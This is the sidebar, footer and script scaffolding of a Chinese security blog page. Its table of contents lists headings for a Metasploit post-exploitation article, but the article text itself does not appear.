class="toc-link" href="#%E7%BD%91%E7%BB%9C%E6%91%84%E5%83%8F%E5%A4%B4"><span class="toc-number">3.4.</span> <span class="toc-text">网络摄像头</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E8%84%9A%E6%9C%AC%E5%91%BD%E4%BB%A4"><span class="toc-number">3.5.</span> <span class="toc-text">一些脚本命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E7%A8%8B%E5%BA%8F"><span class="toc-number">3.6.</span> <span class="toc-text">运行程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E8%B4%A6%E5%8F%B7"><span class="toc-number">3.7.</span> <span class="toc-text">创建账号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%AF%E7%94%A8%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2"><span class="toc-number">3.8.</span> <span class="toc-text">启用远程桌面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%91%E5%AE%9A%E8%BF%9B%E7%A8%8B"><span class="toc-number">3.9.</span> <span class="toc-text">绑定进程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E5%85%B6-shell-%E6%9D%A5%E5%85%B3%E9%97%AD%E9%98%B2%E7%81%AB%E5%A2%99"><span class="toc-number">3.10.</span> <span class="toc-text">通过其 shell 来关闭防火墙</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%B7%BB%E5%8A%A0-NC-%E5%90%8E%E9%97%A8"><span class="toc-number">3.11.</span> <span class="toc-text">利用注册表添加 NC 后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8EMACE%E6%97%B6%E9%97%B4%E7%9A%84%E5%8F%8D%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81"><span class="toc-number">3.12.</span> <span class="toc-text">基于MACE时间的反电子取证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86"><span class="toc-number">3.13.</span> <span class="toc-text">内网代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH%E4%BB%A3%E7%90%86"><span class="toc-number">3.14.</span> <span class="toc-text">SSH代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%89%AB%E6%8F%8F"><span class="toc-number">3.15.</span> <span class="toc-text">内网扫描</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%A0%B4%E8%A7%A3%E6%A8%A1%E5%9D%97%E5%92%8C%E8%84%9A%E6%9C%AC"><span class="toc-number">4.</span> <span class="toc-text">常用破解模块和脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A5%BD%E7%94%A8%E7%9A%84%E6%A8%A1%E5%9D%97"><span class="toc-number">4.1.</span> <span class="toc-text">好用的模块</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC"><span class="toc-number">4.2.</span> <span class="toc-text">脚本</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#msfvenom"><span class="toc-number">5.</span> <span class="toc-text">msfvenom</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96meterpreter"><span class="toc-number">6.</span> <span class="toc-text">获取meterpreter</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8C%81%E7%BB%AD%E6%80%A7%E5%90%8E%E9%97%A8"><span class="toc-number">7.</span> <span class="toc-text">持续性后门</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#metsvc%E5%90%8E%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9D%97"><span class="toc-number">7.1.</span> <span class="toc-text">metsvc后渗透攻击模块</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#persistence%E6%A8%A1%E5%9D%97%E5%90%8E%E9%97%A8"><span class="toc-number">7.2.</span> <span class="toc-text">persistence模块后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#meterpreter%E7%BB%95%E8%BF%87uac"><span class="toc-number">7.3.</span> <span class="toc-text">meterpreter绕过uac</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E7%94%A8%E6%88%B7%E5%B8%90%E6%88%B7%E6%8E%A7%E5%88%B6-UAC-%EF%BC%9F"><span class="toc-number">7.3.1.</span> <span class="toc-text">什么是用户帐户控制(UAC)？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UAC%E5%A6%82%E4%BD%95%E8%BF%90%E8%A1%8C%EF%BC%9F"><span class="toc-number">7.3.2.</span> <span class="toc-text">UAC如何运行？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87uac%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">7.3.3.</span> <span class="toc-text">绕过uac的方法</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-number">7.3.3.0.1.</span> <span class="toc-text">方法一</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C-%EF%BC%9AWindows%E6%9D%83%E9%99%90%E5%8D%87%E7%BA%A7%E7%BB%95%E8%BF%87UAC%E4%BF%9D%E6%8A%A4"><span class="toc-number">7.3.3.0.2.</span> <span class="toc-text">方法二(：Windows权限升级绕过UAC保护)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89-%E5%86%85%E5%AD%98%E6%B3%A8%E5%85%A5"><span class="toc-number">7.3.3.0.3.</span> <span class="toc-text">方法三(内存注入)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E5%9B%9B-%E9%80%9A%E8%BF%87FodHelper%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%A1%B9"><span class="toc-number">7.3.3.0.4.</span> <span class="toc-text">方法四(通过FodHelper注册表项)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%94-%E9%80%9A%E8%BF%87Eventvwr%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%A1%B9"><span class="toc-number">7.3.3.0.5.</span> <span class="toc-text">方法五(通过Eventvwr注册表项)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E5%85%AD-%E9%80%9A%E8%BF%87COM%E5%A4%84%E7%90%86%E7%A8%8B%E5%BA%8F%E5%8A%AB%E6%8C%81"><span class="toc-number">7.3.3.0.6.</span> <span class="toc-text">方法六(通过COM处理程序劫持)</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#meterprter%E5%AE%9E%E6%88%98%E6%94%BB%E5%87%BBwindows2008r2x64"><span class="toc-number">8.</span> <span class="toc-text">meterprter实战攻击windows2008r2x64</span></a></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/07/31/hello-world/" title="Hello World"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hello World"/></a><div class="content"><a class="title" href="/2021/07/31/hello-world/" title="Hello World">Hello World</a><time datetime="2021-07-31T14:18:47.559Z" title="发表于 2021-07-31 22:18:47">2021-07-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/31/XSS/%E4%B8%89%E7%A7%8Dxss%E7%9A%84%E5%8C%BA%E5%88%AB/" title="三种xss的区别"><img src="/img/image/%20.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="三种xss的区别"/></a><div class="content"><a class="title" href="/2021/07/31/XSS/%E4%B8%89%E7%A7%8Dxss%E7%9A%84%E5%8C%BA%E5%88%AB/" title="三种xss的区别">三种xss的区别</a><time datetime="2021-07-31T13:23:29.000Z" title="发表于 2021-07-31 21:23:29">2021-07-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/31/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/Cookie/" title="Cookie"><img src="/img/image/1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Cookie"/></a><div class="content"><a class="title" href="/2021/07/31/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/Cookie/" title="Cookie">Cookie</a><time datetime="2021-07-31T13:22:32.000Z" title="发表于 2021-07-31 21:22:32">2021-07-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/31/SQL%E6%B3%A8%E5%85%A5/%E9%A2%84%E7%BC%96%E8%AF%91/" title="预编译"><img src="/img/image/19.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="预编译"/></a><div class="content"><a class="title" href="/2021/07/31/SQL%E6%B3%A8%E5%85%A5/%E9%A2%84%E7%BC%96%E8%AF%91/" title="预编译">预编译</a><time datetime="2021-07-31T13:19:28.000Z" title="发表于 2021-07-31 21:19:28">2021-07-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/31/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/LDAP/" title="LDAP"><img src="/img/image/%20.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="LDAP"/></a><div class="content"><a class="title" href="/2021/07/31/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/LDAP/" title="LDAP">LDAP</a><time datetime="2021-07-31T13:17:25.000Z" title="发表于 2021-07-31 21:17:25">2021-07-31</time></div></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/%E5%9B%BE%E5%BA%93/9.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By h0ld1rs</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module" defer></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    let initData = {
+      el: '#vcomment',
+      appId: 'VW87gUH9lGz0MqQ26R0dxvzS-gzGzoHsz',
+      appKey: 'hXDx5AOht2WentElxJRM8xnK',
+      placeholder: '来啊，快活啊!',
+      avatar: 'monsterid',
+      meta: 'nick'.split(','),
+      pageSize: '10',
+      lang: 'zh-CN',
+      recordIP: false,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: false,
+      path: window.location.pathname,
+    }
+
+    if (true) { 
+      initData.requiredFields= ('nick'.split(','))
+    }
+    
+    if (false) {
+      const otherData = false
+      initData = Object.assign({}, initData, otherData)
+    }
+    
+    const valine = new Valine(initData)
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else $.getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js', initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.querySelector('#vcomment'),loadValine)
+  else setTimeout(() => loadValine(), 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script>(function(){
+  const bp = document.createElement('script');
+  const curProtocol = window.location.protocol.split(':')[0];
+  if (curProtocol === 'https'){
+  bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else{
+  bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+  bp.dataset.pjax = ''
+  const s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(bp, s);
+})()</script></div></body></html>
